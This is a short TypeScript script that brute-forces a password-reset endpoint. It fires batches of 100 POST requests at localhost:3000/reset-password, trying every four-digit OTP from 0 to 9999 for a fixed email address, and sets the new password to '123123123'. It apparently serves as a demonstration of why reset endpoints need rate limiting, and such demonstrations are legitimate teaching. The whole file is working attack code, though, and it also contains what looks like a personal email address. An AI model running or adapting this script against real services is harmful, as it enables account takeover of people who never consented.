import axios from "axios";

async function sendRequest(otp: number) {
 
  try {
    const responce = await axios.post('http://localhost:3000/reset-password', {
      email: "deepanshusaini2711@gmail.com",
      otp: otp.toString(),
      newPassword: "123123123"
    })
    console.log("done for " + otp);
  } catch(e) {
    // console.log(e)
  }
}


// this will send 100 requests and then wait for responce and send another 100 requests
async function main() {
  for (let i = 0; i < 10000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()

// sendRequest(7929)